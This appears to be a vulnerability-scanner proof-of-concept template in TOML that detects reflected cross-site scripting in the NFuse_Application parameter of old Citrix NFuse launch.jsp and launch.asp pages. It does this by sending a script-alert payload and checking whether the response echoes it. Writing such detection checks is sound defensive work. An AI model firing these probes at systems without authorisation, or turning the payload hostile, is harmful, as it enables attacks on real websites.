[info]
author = "ave"
description = "检测 Citrix NFuse 1.6 及更早版本 launch.jsp 和 launch.asp 的 NFuse_Application 参数反射型 XSS 漏洞"
id = "POC-AVE-2002-0321"
name = "Citrix NFuse Cross-Site Scripting PoC"
severity = "high"
tags = ["ave-2002-0321"]
vuln_id = [
    "CVE-2002-0504",
    "AVE-2002-0321",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/nfuse/launch.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS')</script>"]

[poc.requests.query]
NFuse_Application = "<script>alert('XSS')</script>"

[[poc.requests]]
method = "GET"
path = "/nfuse/launch.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS')</script>"]

[poc.requests.query]
NFuse_Application = "<script>alert('XSS')</script>"

[[poc.requests]]
method = "GET"
path = "/launch.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS')</script>"]

[poc.requests.query]
NFuse_Application = "<script>alert('XSS')</script>"

[[poc.requests]]
method = "GET"
path = "/launch.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS')</script>"]

[poc.requests.query]
NFuse_Application = "<script>alert('XSS')</script>"
